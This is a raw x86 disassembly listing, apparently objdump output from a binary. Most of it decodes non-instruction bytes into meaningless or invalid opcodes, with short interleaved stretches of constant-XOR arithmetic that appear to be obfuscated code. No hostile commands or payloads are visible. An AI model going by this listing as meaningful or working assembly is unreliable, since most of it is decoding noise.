  40c2f6:	dec    esp
  40c2f7:	mov    edi,0xe5e6b556
  40c2fc:	xchg   edi,eax
  40c2fd:	sar    DWORD PTR [edi-0x2d0aaa57],0x1a
  40c304:	test   BYTE PTR [esi+edx*1-0x1b50864b],bh
  40c30b:	push   eax
  40c30c:	push   0x3e
  40c30e:	dec    esp
  40c30f:	pushf  
  40c310:	(bad)  
  40c311:	cs out dx,al
  40c313:	stos   BYTE PTR es:[edi],al
  40c314:	(bad)  
  40c316:	scas   al,BYTE PTR es:[edi]
  40c317:	xor    DWORD PTR [ebx],edx
  40c319:	test   DWORD PTR [eax+0x4bd35d7],esp
  40c31f:	dec    ecx
  40c320:	shr    bh,1
  40c322:	jns    0x40c36f
  40c324:	pop    esi
  40c325:	mov    bh,0x4f
  40c327:	je     0x40c35c
  40c329:	sub    ecx,edi
  40c32b:	or     bh,BYTE PTR [bx+0xb]
  40c32f:	push   edi
  40c330:	push   ebp
  40c331:	dec    ebp
  40c332:	sbb    BYTE PTR [eax],ch
  40c334:	inc    esi
  40c335:	sbb    eax,0xaef0fdd4
  40c33a:	int    0xa7
  40c33c:	je     0x40c2c4
  40c33e:	ret    
  40c33f:	jbe    0x40c318
  40c341:	popa   
  40c342:	or     DWORD PTR [ecx+0x3d],esi
  40c345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c346:	push   eax
  40c347:	cdq    
  40c348:	xchg   edx,eax
  40c34a:	stos   DWORD PTR es:[edi],eax
  40c34b:	or     edx,esp
  40c34d:	sar    DWORD PTR cs:[esi-0x1c],1
  40c351:	push   esi
  40c352:	pop    ebp
  40c353:	sbb    ebp,DWORD PTR gs:[ebx+ecx*1]
  40c357:	mov    ch,0x91
  40c359:	imul   ecx,DWORD PTR [edi-0x28],0xd64b299
  40c360:	jmp    0xed6732a3
  40c365:	int    0x1d
  40c367:	mov    edi,0x5e506ad6
  40c36c:	push   edx
  40c36d:	push   edi
  40c36e:	jae    0x40c3eb
  40c370:	dec    edi
  40c371:	xchg   esp,eax
  40c372:	xchg   edx,eax
  40c373:	mov    ch,0x84
  40c375:	or     al,0x54
  40c377:	or     al,0xf9
  40c379:	imul   esi,DWORD PTR [ecx+0x10],0x0
  40c37d:	cmp    bh,ah
  40c37f:	xor    ch,BYTE PTR [esp+esi*8+0x7a]
  40c383:	push   ss
  40c384:	push   esi
  40c385:	sti    
  40c386:	xchg   esp,eax
  40c387:	add    al,0xde
  40c389:	pop    esp
  40c38a:	enter  0x1660,0x31
  40c38e:	mov    DWORD PTR [esi-0x3c],ebx
  40c391:	sbb    al,0x53
  40c393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c394:	or     eax,DWORD PTR [ecx-0x60]
  40c397:	cs sti 
  40c399:	mov    ch,0xfc
  40c39b:	cmp    al,0x90
  40c39d:	fs repz cld 
  40c3a0:	sbb    cl,al
  40c3a2:	jno    0x40c329
  40c3a4:	mov    fs,WORD PTR [esi+ecx*1-0x6d7df305]
  40c3ab:	cdq    
  40c3ac:	cmp    DWORD PTR [ebp+0x37edff1d],esi
  40c3b2:	inc    edx
  40c3b3:	pop    es
  40c3b4:	xor    al,0x68
  40c3b6:	ss repnz mov gs,edi
  40c3ba:	sbb    DWORD PTR [ebx+ecx*4-0x4b],eax
  40c3be:	(bad)  
  40c3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3c1:	adc    al,0xc7
  40c3c3:	mov    ah,0x7f
  40c3c5:	dec    esp
  40c3c6:	mov    ebp,0x7d13e440
  40c3cb:	dec    ebx
  40c3cc:	mov    ah,0xfb
  40c3ce:	(bad)  
  40c3cf:	fwait
  40c3d0:	ss sub al,0x8f
  40c3d3:	shl    DWORD PTR [esi-0x5acb7883],cl
  40c3d9:	imul   ebx,DWORD PTR [edi+ecx*1+0x1],0xbef6a5ce
  40c3e1:	xor    ebx,ecx
  40c3e3:	shr    BYTE PTR [ebp+0x28],cl
  40c3e6:	stos   BYTE PTR es:[edi],al
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	sar    DWORD PTR [edi],cl
  40c447:	pop    ss
  40c448:	cmp    DWORD PTR [ecx+0x7e7e8214],edx
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	retf   0x163b
  40c455:	retf   
  40c456:	add    al,BYTE PTR [esi-0x59]
  40c459:	cmp    eax,0xebdd7cbc
  40c45e:	mov    al,ds:0x55afa4f3
  40c463:	xchg   ebp,eax
  40c464:	mov    ebx,0xb1f934b4
  40c469:	push   0xfffffff8
  40c46b:	ins    BYTE PTR es:[edi],dx
  40c46c:	pushf  
  40c46d:	add    dh,dl
  40c46f:	cli    
  40c470:	(bad)  
  40c471:	pop    esp
  40c472:	shl    ch,cl
  40c474:	mov    bl,0x30
  40c476:	jo     0x40c42c
  40c478:	mov    dh,BYTE PTR [esi+0x671291e0]
  40c47e:	mov    ecx,0x4c3a8363
  40c483:	or     dh,BYTE PTR [ebp-0x3]
  40c486:	jae    0x40c4f8
  40c488:	fild   QWORD PTR [eax]
  40c48a:	dec    ecx
  40c48b:	pop    ebp
  40c48c:	sub    ebp,0x2eab934d
  40c492:	jne    0x40c4d4
  40c494:	ror    esp,1
  40c496:	(bad)  
  40c497:	dec    DWORD PTR [edi]
  40c499:	loope  0x40c498
  40c49b:	mov    cl,0x1d
  40c49d:	stos   DWORD PTR es:[edi],eax
  40c49e:	and    BYTE PTR [esi+0x5],0x3c
  40c4a2:	sbb    DWORD PTR [esi-0x5840d014],ebx
  40c4a8:	sub    al,0x31
  40c4aa:	mov    ebx,0xa7fd4ffb
  40c4af:	sub    dl,bl
  40c4b1:	xchg   ebx,eax
  40c4b2:	mov    esp,0x22644677
  40c4b7:	jno    0x40c4ef
  40c4b9:	in     al,dx
  40c4ba:	xchg   BYTE PTR [edi+0x51d34061],al
  40c4c0:	lock mov ebx,0x45f5872d
  40c4c6:	ds push ss
  40c4c8:	leave  
  40c4c9:	rcl    al,1
  40c4cb:	loopne 0x40c4f3
  40c4cd:	xor    DWORD PTR [eax],edi
  40c4cf:	jle    0x40c488
  40c4d1:	xchg   edi,eax
  40c4d2:	je     0x40c4bd
  40c4d4:	xchg   BYTE PTR [eax-0x5ddc9c3e],dh
  40c4da:	imul   esi,edx,0xffffffd8
  40c4dd:	mov    ds:0xbc61eada,al
  40c4e2:	repz imul ebx,ebp,0x73c1af81
  40c4e9:	cmp    eax,0x4250e075
  40c4ee:	push   esp
  40c4ef:	mov    ecx,ebx
  40c4f1:	nop
  40c4f2:	inc    edx
  40c4f3:	dec    edx
  40c4f4:	(bad)  
  40c4f5:	or     al,0xc7
  40c4f7:	and    edx,DWORD PTR [eax]
  40c4f9:	test   edx,0xa0e572d4
  40c4ff:	xchg   BYTE PTR [ecx+0x7a],ah
  40c502:	cmp    al,0x64
  40c504:	and    BYTE PTR [ecx-0x3ef15682],ch
  40c50a:	xor    eax,DWORD PTR [edi]
  40c50c:	adc    ebp,0x9d9667c1
  40c512:	mov    bh,0x8c
  40c514:	inc    ecx
  40c515:	retf   0xb945
  40c518:	(bad)  
  40c519:	in     eax,dx
  40c51a:	jo     0x40c55b
  40c51c:	cmp    DWORD PTR [edx+0x21],0xffffffd9
  40c520:	or     dl,BYTE PTR [ecx]
  40c522:	add    al,0xfc
  40c524:	xchg   edx,eax
  40c525:	out    0xea,al
  40c527:	xchg   edx,eax
  40c528:	loopne 0x40c512
  40c52a:	push   ebp
  40c52b:	fist   WORD PTR [esi+0xc255f37]
  40c531:	mov    dl,0x5e
  40c533:	inc    ebx
  40c534:	es mov esi,0xa0844059
  40c53a:	(bad)  
  40c53b:	stc    
  40c53c:	lods   eax,DWORD PTR ds:[esi]
  40c53d:	cli    
  40c53e:	cmovno ecx,esp
  40c541:	adc    esp,ecx
  40c543:	icebp  
  40c544:	fmul   QWORD PTR [edi-0x2e2df0da]
  40c54a:	stos   DWORD PTR es:[edi],eax
  40c54b:	jp     0x40c4fe
  40c54d:	add    dh,BYTE PTR [ecx+edx*8+0x25]
  40c551:	sar    DWORD PTR [eax-0x6911fba],cl
  40c557:	xchg   ebx,eax
  40c558:	push   0xa3d38347
  40c55d:	add    esi,DWORD PTR [esi]
  40c55f:	mov    DWORD PTR [ecx],edx
  40c561:	dec    esi
  40c562:	jae    0x40c509
  40c564:	pop    ss
  40c565:	neg    BYTE PTR [ebx+0x36]
  40c568:	out    0x14,al
  40c56a:	add    al,0x7c
  40c56c:	stos   BYTE PTR es:[edi],al
  40c56d:	mov    ss,edx
  40c56f:	adc    bh,BYTE PTR [eax-0x5a]
  40c572:	aam    0x1b
  40c574:	or     edx,DWORD PTR [ebx+0x2f]
  40c577:	add    eax,0xcd309738
  40c57c:	mov    cl,0xc3
  40c57e:	xor    bl,ch
  40c580:	mov    esi,0x523f81e6
  40c585:	loopne 0x40c53f
  40c587:	and    BYTE PTR [ecx-0x4577b5cd],ch
  40c58d:	mov    BYTE PTR ds:0xa9c701a2,0x20
  40c594:	lahf   
  40c595:	xlat   BYTE PTR ds:[ebx]
  40c596:	jmp    0x40c5be
  40c598:	dec    ebx
  40c599:	sbb    DWORD PTR [ebp+0x3],edx
  40c59c:	ins    DWORD PTR es:[edi],dx
  40c59d:	and    BYTE PTR [edi],0x6c
  40c5a0:	fwait
  40c5a1:	adc    esi,edx
  40c5a3:	sbb    eax,0xb48182ca
  40c5a8:	or     BYTE PTR [ebp+0x6e],bl
  40c5ab:	dec    edi
  40c5ac:	and    dl,ah
  40c5ae:	jno    0x40c5b4
  40c5b0:	in     eax,0xbd
  40c5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b3:	xchg   ebx,eax
  40c5b4:	lods   al,BYTE PTR ds:[esi]
  40c5b5:	pop    eax
  40c5b6:	mov    DWORD PTR [edx],eax
  40c5b8:	gs push ss
  40c5ba:	dec    edx
  40c5bb:	mov    al,0xea
  40c5bd:	sub    dh,BYTE PTR ds:[esi-0x1f897be7]
  40c5c4:	xor    cl,al
  40c5c6:	adc    DWORD PTR [eax],esi
  40c5c8:	xor    BYTE PTR [eax],dh
  40c5ca:	stos   BYTE PTR es:[edi],al
  40c5cb:	xchg   DWORD PTR [ebp+0x4237b572],edi
  40c5d1:	jmp    0x1b822664
  40c5d6:	sbb    DWORD PTR [ecx],0xffffff98
  40c5d9:	lods   eax,DWORD PTR ds:[esi]
  40c5da:	das    
  40c5db:	pop    ebp
  40c5dc:	icebp  
  40c5dd:	pop    ds
  40c5de:	pusha  
  40c5df:	push   esp
  40c5e0:	dec    edx
  40c5e1:	jno    0x40c56d
  40c5e3:	arpl   bx,cx
  40c5e5:	mov    bl,0xd7
  40c5e7:	sbb    eax,ebx
  40c5e9:	xchg   ebp,eax
  40c5ea:	cmp    eax,0xb7e1a873
  40c5ef:	jge    0x40c646
  40c5f1:	push   cs
  40c5f2:	push   0xffffffed
  40c5f4:	stos   BYTE PTR es:[edi],al
  40c5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5f6:	(bad)  
  40c5f7:	sar    DWORD PTR [edx],1
  40c5f9:	inc    esi
  40c5fa:	and    eax,DWORD PTR [edi]
  40c5fc:	repnz or dl,BYTE PTR [esi-0x27]
  40c600:	call   0x313c1690
  40c605:	test   DWORD PTR ds:0x58cb4a33,esi
  40c60b:	cdq    
  40c60c:	retf   0x1890
  40c60f:	loope  0x40c663
  40c611:	(bad)  
  40c612:	jecxz  0x40c650
  40c614:	or     ch,BYTE PTR [edi+0x5e]
  40c617:	mov    ch,0x36
  40c619:	imul   edx,DWORD PTR [esi+0x4],0x90b2972e
  40c620:	xor    edx,DWORD PTR [edi]
  40c622:	inc    ecx
  40c623:	pop    ecx
  40c624:	cli    
  40c625:	pop    edi
  40c626:	cmc    
  40c627:	mov    dh,0x89
  40c629:	ror    DWORD PTR [ebx+0x3901e667],1
  40c62f:	jnp    0x40c60b
  40c631:	(bad)  
  40c633:	hlt    
  40c634:	jmp    0xfbe3c6d6
  40c639:	cli    
  40c63a:	pop    edx
  40c63b:	push   es
  40c63c:	test   dh,cl
  40c63e:	mov    esp,0x32351e78
  40c643:	jmp    0x40c64e
  40c645:	pop    esi
  40c646:	ss pop ds
  40c648:	mov    eax,ds:0xb4704e1d
  40c64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c64e:	cmp    DWORD PTR ds:0x949e282e,ebx
  40c654:	scas   eax,DWORD PTR es:[edi]
  40c655:	fidivr WORD PTR [eax-0x15]
  40c658:	sub    al,0x72
  40c65a:	(bad)  
  40c65b:	sbb    al,0x10
  40c65d:	sbb    ecx,esp
  40c65f:	rcr    esp,cl
  40c661:	mov    ebp,0x9cdb7ac5
  40c666:	adc    dh,BYTE PTR [ebp-0x61a95cfb]
  40c66c:	fisttp WORD PTR [edi-0x5]
  40c66f:	in     eax,0xa3
  40c671:	xor    dl,0x29
  40c674:	icebp  
  40c675:	pop    esi
  40c676:	les    ebx,FWORD PTR [ebp-0x71]
  40c679:	push   ebp
  40c67a:	mov    ds:0x5d7dec19,al
  40c67f:	jo     0x40c6a3
  40c681:	test   eax,0x5efdea62
  40c686:	(bad)  
  40c687:	fbld   TBYTE PTR [ecx]
  40c689:	or     ch,dh
  40c68b:	int    0xc0
  40c68d:	nop
  40c68e:	push   es
  40c68f:	retf   
  40c690:	or     eax,0x3aa33ee
  40c695:	es (bad) 
  40c697:	adc    eax,0x32729bbe
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x2207653f],dl
  40c6de:	sti    
  40c6df:	cmc    
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	cmp    cl,bl
  40c6ea:	pop    ss
  40c6eb:	dec    edi
  40c6ec:	(bad)  [ebp-0x71]
  40c6ef:	in     al,0x3c
  40c6f1:	iret   
  40c6f2:	mov    eax,0x254b5c3b
  40c6f7:	aam    0x74
  40c6f9:	stos   BYTE PTR es:[edi],al
  40c6fa:	push   edx
  40c6fb:	popa   
  40c6fc:	leave  
  40c6fd:	or     eax,ecx
  40c6ff:	adc    al,0xe
  40c701:	shl    BYTE PTR [eax-0x63c6eb54],0x2b
  40c708:	jmp    0xec75:0xa85ce178
  40c70f:	adc    DWORD PTR [esi],0x20
  40c712:	repz push cs
  40c714:	lods   al,BYTE PTR ds:[esi]
  40c715:	std    
  40c716:	dec    ebx
  40c717:	cmp    al,0x7b
  40c719:	das    
  40c71a:	test   al,0xda
  40c71d:	clc    
  40c71e:	addr16 out dx,al
  40c720:	jp     0x40c78b
  40c722:	jno    0x40c6fd
  40c724:	cmp    al,0x6a
  40c726:	iret   
  40c727:	xchg   esp,eax
  40c728:	inc    bp
  40c72a:	ja     0x40c7a6
  40c72c:	dec    eax
  40c72d:	aas    
  40c72e:	in     eax,dx
  40c72f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c730:	and    BYTE PTR [ecx-0x6971041e],bl
  40c736:	popa   
  40c737:	popa   
  40c738:	and    dh,BYTE PTR [ebx+0x5b43f303]
  40c73e:	mov    esp,0xd51c8c4f
  40c743:	outs   dx,DWORD PTR ds:[esi]
  40c744:	xor    ah,BYTE PTR [ebx+0x48]
  40c747:	fcmovne st,st(7)
  40c749:	cdq    
  40c74a:	es mov ah,0x5a
  40c74d:	mov    DWORD PTR [ebx+0x2c441e74],esi
  40c753:	call   DWORD PTR [esp+ebx*4]
  40c756:	enter  0x45a3,0xb5
  40c75a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c75b:	call   0x1e5b:0xea6b6b6c
  40c762:	sbb    BYTE PTR ds:0xf57cef52,dh
  40c769:	adc    BYTE PTR [ebx+esi*8-0x69],ch
  40c76d:	lods   eax,DWORD PTR ds:[esi]
  40c76e:	shr    bl,cl
  40c770:	mov    esi,0xf3a5a69e
  40c775:	sti    
  40c776:	into   
  40c777:	in     al,0xcd
  40c779:	out    dx,al
  40c77a:	sbb    eax,0x90247364
  40c77f:	in     al,dx
  40c780:	int3   
  40c781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c782:	in     eax,0x9b
  40c784:	xchg   esp,eax
  40c785:	push   cs
  40c786:	outs   dx,DWORD PTR ds:[esi]
  40c787:	jg     0x40c742
  40c789:	inc    edx
  40c78a:	repz pop ss
  40c78c:	mov    edi,0x56de787a
  40c791:	push   ss
  40c792:	adc    al,0x2a
  40c794:	cwde   
  40c795:	xchg   edx,eax
  40c796:	loope  0x40c7c1
  40c798:	jmp    0x40c806
  40c79a:	test   DWORD PTR [ecx],0x4cc6ef4
  40c7a0:	(bad)  
  40c7a2:	ror    cl,cl
  40c7a4:	les    ebp,FWORD PTR [ebp+0x2bc6d9e5]
  40c7aa:	dec    esp
  40c7ab:	adc    ebp,eax
  40c7ad:	fldenv [ebx-0x51]
  40c7b0:	loope  0x40c7bf
  40c7b2:	inc    edx
  40c7b3:	xchg   edx,eax
  40c7b4:	fwait
  40c7b5:	lea    esp,[edi+eiz*2]
  40c7b8:	or     cl,BYTE PTR [edx-0x7f]
  40c7bb:	loope  0x40c783
  40c7bd:	stc    
  40c7be:	inc    edx
  40c7bf:	jle    0x40c7cb
  40c7c1:	pop    ss
  40c7c2:	push   0x41a9a55e
  40c7c7:	ret    
  40c7c8:	js     0x40c834
  40c7ca:	ret    
  40c7cb:	mov    cl,dh
  40c7cd:	pop    eax
  40c7ce:	neg    BYTE PTR [ecx-0x5c]
  40c7d1:	jmp    0xef05989e
  40c7d6:	js     0x40c7e2
  40c7d8:	enter  0xcc0d,0x3f
  40c7dc:	add    dh,BYTE PTR [ecx+0x5d]
  40c7df:	call   0x6fc6367f
  40c7e4:	pop    ebx
  40c7e5:	mov    eax,0x27eabbf4
  40c7ea:	cmc    
  40c7eb:	sbb    dh,bl
  40c7ed:	fsubr  DWORD PTR [ecx+0x450d2857]
  40c7f3:	call   0x35c3e5b3
  40c7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f9:	mov    DWORD PTR ds:0x97ebedf4,esi
  40c7ff:	je     0x40c7c3
  40c801:	imul   esi,DWORD PTR [edi-0x24],0xffffff8c
  40c805:	dec    esi
  40c806:	mov    eax,0x88b2b77c
  40c80b:	fld    QWORD PTR [esi+0xf8fde00]
  40c811:	xchg   ebx,eax
  40c812:	mov    bl,0x85
  40c814:	jae    0x40c7b9
  40c816:	fadd   QWORD PTR [ebx+0x2bee291d]
  40c81c:	outs   dx,BYTE PTR ds:[esi]
  40c81d:	mov    ah,0x8
  40c81f:	cld    
  40c820:	adc    eax,0x8c591e1b
  40c825:	jle    0x40c879
  40c827:	mov    ecx,0x2cb0ddc9
  40c82c:	add    eax,0xb5504a3e
  40c831:	lods   eax,DWORD PTR ds:[esi]
  40c832:	out    dx,al
  40c833:	rcr    BYTE PTR [ebp-0x7b],cl
  40c836:	int3   
  40c837:	das    
  40c838:	es pop edx
  40c83a:	arpl   WORD PTR [edi-0x26244fb2],dx
  40c840:	psrlq  mm2,QWORD PTR [edi+0x64]
  40c844:	int    0x6c
  40c846:	pop    esp
  40c847:	cs cmp eax,0xf4015dc8
  40c84d:	jns    0x40c8a6
  40c84f:	push   0xe
  40c851:	in     eax,0xa2
  40c853:	test   al,0xf6
  40c855:	ins    DWORD PTR es:[edi],dx
  40c856:	daa    
  40c857:	ret    
  40c858:	push   cs
  40c859:	in     eax,0x3b
  40c85b:	pop    ebp
  40c85c:	or     BYTE PTR [ebp-0x431261ca],dl
  40c862:	test   al,0x93
  40c864:	pop    ss
  40c865:	nop    DWORD PTR [ecx]
  40c868:	sahf   
  40c869:	cli    
  40c86a:	rcr    cl,0x72
  40c86d:	xor    BYTE PTR [ebx-0x5a],al
  40c870:	cmp    eax,edx
  40c872:	call   0x96b0eac1
  40c877:	mov    ?,WORD PTR [edi+0x1e83a7d]
  40c87d:	or     esp,esp
  40c87f:	sbb    bh,BYTE PTR [esi+0x6897a185]
  40c885:	cmp    edx,DWORD PTR [ebx+0x5e20d248]
  40c88b:	adc    BYTE PTR [esi-0x5b242013],bh
  40c891:	jbe    0x40c876
  40c893:	rcr    BYTE PTR [edi],1
  40c895:	inc    ecx
  40c896:	adc    eax,DWORD PTR [edx+0x11fa5258]
  40c89c:	xor    BYTE PTR [edx],al
  40c89e:	test   eax,0xcc08cf6b
  40c8a3:	jnp    0x40c83c
  40c8a5:	jo     0x40c8ec
  40c8a7:	dec    ebp
  40c8a8:	sub    bh,BYTE PTR [edx+ebp*8+0x78c48f75]
  40c8af:	sub    edi,esi
  40c8b1:	imul   BYTE PTR [edi+ebp*4-0x42b01811]
  40c8b8:	pop    ss
  40c8b9:	dec    ebx
  40c8ba:	out    dx,al
  40c8bb:	pop    ds
  40c8bc:	sub    eax,0xfebf8c2c
  40c8c1:	add    eax,DWORD PTR [edi]
  40c8c3:	mov    edx,0x1fa71c35
  40c8c8:	dec    esp
  40c8c9:	dec    ebp
  40c8ca:	into   
  40c8cb:	xchg   edi,eax
  40c8cc:	das    
  40c8cd:	(bad)  
  40c8ce:	mov    ecx,0x2737dcee
  40c8d3:	pusha  
  40c8d4:	retf   0x8ff6
  40c8d7:	inc    esi
  40c8d8:	dec    esi
  40c8d9:	dec    esi
  40c8da:	dec    ecx
  40c8db:	bound  eax,QWORD PTR [edx+0x15a7bdc0]
  40c8e1:	push   cs
  40c8e2:	test   DWORD PTR [ebx+0x42994334],0x3fdef8d0
  40c8ec:	and    al,0x67
  40c8ee:	aaa    
  40c8ef:	fs (bad) 
  40c8f1:	neg    DWORD PTR [ecx]
  40c8f3:	xchg   esp,edx
  40c8f5:	das    
  40c8f6:	stos   DWORD PTR es:[edi],eax
  40c8f7:	mov    esp,0xf3cfa845
  40c8fc:	in     eax,dx
  40c8fd:	inc    si
  40c8ff:	retf   0x2201
  40c902:	test   DWORD PTR [esi],0xabc26152
  40c908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c909:	cs adc eax,0xbedcfb99
  40c90f:	(bad)  
  40c910:	(bad)  [edi-0x1701ef4e]
  40c916:	cmp    ecx,DWORD PTR [ebp+0x14]
  40c919:	cmp    al,0xb8
  40c91b:	cdq    
  40c91c:	sti    
  40c91d:	(bad)  
  40c91e:	cld    
  40c91f:	ror    BYTE PTR [ebp+0xd46e186],0xed
  40c926:	xor    esi,DWORD PTR [esi-0xc225651]
  40c92c:	and    al,0xef
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [esi-0x67b33889],ebp
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	cdq    
  40c951:	jmp    0x40c8e3
  40c953:	sar    BYTE PTR [esi+0x27],1
  40c956:	xchg   edx,eax
  40c957:	pushf  
  40c958:	inc    eax
  40c959:	(bad)  
  40c95b:	cld    
  40c95c:	dec    ebx
  40c95d:	pop    ecx
  40c95e:	jmp    0x63b2c345
  40c963:	dec    ebp
  40c964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c965:	pop    esp
  40c966:	lods   eax,DWORD PTR ds:[esi]
  40c967:	jecxz  0x40c959
  40c969:	pop    esi
  40c96a:	sub    edx,DWORD PTR [ebx-0x2c]
  40c96d:	loop   0x40c98c
  40c96f:	add    DWORD PTR [eax+0x4b02654e],esi
  40c975:	hlt    
  40c976:	aaa    
  40c977:	ror    DWORD PTR [ebp+0x1d],0x7e
  40c97b:	icebp  
  40c97c:	ja     0x40c93c
  40c97e:	pop    ss
  40c97f:	pop    eax
  40c980:	pop    ebp
  40c981:	mul    DWORD PTR [eax-0x77]
  40c984:	leave  
  40c985:	ins    DWORD PTR es:[edi],dx
  40c986:	fwait
  40c987:	cld    
  40c988:	popa   
  40c989:	repz test eax,0xc9674c68
  40c98f:	jle    0x40c94c
  40c991:	popf   
  40c992:	mov    ch,0x2f
  40c994:	or     al,0x14
  40c996:	dec    esp
  40c997:	mov    ds:0x595a4558,al
  40c99c:	jle    0x40c96c
  40c99e:	xor    bh,ch
  40c9a0:	outs   dx,DWORD PTR ds:[esi]
  40c9a1:	retf   0xc16f
  40c9a4:	cmp    bl,al
  40c9a6:	sub    edx,DWORD PTR fs:[esi+0x24]
  40c9aa:	(bad)  
  40c9ab:	cwde   
  40c9ac:	jne    0x40c974
  40c9ae:	mov    al,ds:0xeb3110dc
  40c9b3:	imul   ebp,DWORD PTR [ebp+0x366be3ed],0x3d937cbd
  40c9bd:	(bad)  
  40c9be:	sub    al,BYTE PTR [ecx-0x42]
  40c9c1:	(bad)  
  40c9c3:	jmp    0x40c9ea
  40c9c5:	call   0x564b:0x30ebf1ab
  40c9cc:	addr16 add al,0x38
  40c9cf:	mov    esi,0x9d5ea37a
  40c9d4:	pop    ecx
  40c9d5:	sahf   
  40c9d6:	shl    eax,cl
  40c9d8:	into   
  40c9d9:	mov    ah,0xc9
  40c9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9dc:	cmp    esi,esp
  40c9de:	sbb    DWORD PTR [ebx-0x3],ebp
  40c9e1:	inc    eax
  40c9e2:	lds    edx,FWORD PTR [ebx+0x6]
  40c9e5:	push   0x63
  40c9e7:	fisubr WORD PTR [ebp+0x49aa0d93]
  40c9ed:	jmp    0xe7143ae0
  40c9f2:	in     al,dx
  40c9f3:	fcmovb st,st(2)
  40c9f5:	sbb    BYTE PTR ds:0x81e9530a,bl
  40c9fb:	cmp    al,0x22
  40c9fd:	inc    ebp
  40c9fe:	push   ecx
  40c9ff:	jns    0x40ca00
  40ca01:	mov    BYTE PTR [ebp-0x58],dh
  40ca04:	dec    edi
  40ca05:	jne    0x40ca69
  40ca07:	push   esi
  40ca08:	add    al,0xb2
  40ca0a:	jns    0x40ca59
  40ca0c:	mov    al,ds:0x62d582c
  40ca11:	adc    al,0xdb
  40ca13:	and    DWORD PTR [edx+eiz*8],0xc320f38e
  40ca1a:	push   eax
  40ca1b:	imul   ecx,edi,0xf93ffd85
  40ca21:	cmp    ebx,DWORD PTR [eax]
  40ca23:	(bad)  
  40ca24:	xchg   edx,eax
  40ca25:	jne    0x40ca44
  40ca27:	jb     0x40ca12
  40ca29:	and    BYTE PTR [ecx],cl
  40ca2b:	std    
  40ca2c:	das    
  40ca2d:	pushf  
  40ca2e:	xchg   ecx,eax
  40ca2f:	dec    edx
  40ca30:	cld    
  40ca31:	push   es
  40ca32:	lods   al,BYTE PTR ds:[esi]
  40ca33:	inc    edx
  40ca34:	mov    edi,0x673642a2
  40ca39:	(bad)  [esi]
  40ca3b:	mov    edx,0x840ed7c5
  40ca40:	in     eax,dx
  40ca41:	fistp  WORD PTR [ecx+0x4b596684]
  40ca47:	push   esi
  40ca48:	and    al,cl
  40ca4a:	stc    
  40ca4b:	mul    ah
  40ca4d:	mov    ch,0x9d
  40ca4f:	call   0x7137:0xbf583f70
  40ca56:	scas   al,BYTE PTR es:[edi]
  40ca57:	dec    eax
  40ca58:	add    ecx,DWORD PTR [esi-0x5b450bc8]
  40ca5e:	adc    al,0x81
  40ca60:	sub    esi,DWORD PTR [edx-0x77053ebb]
  40ca66:	add    cl,BYTE PTR [ebx-0x4e]
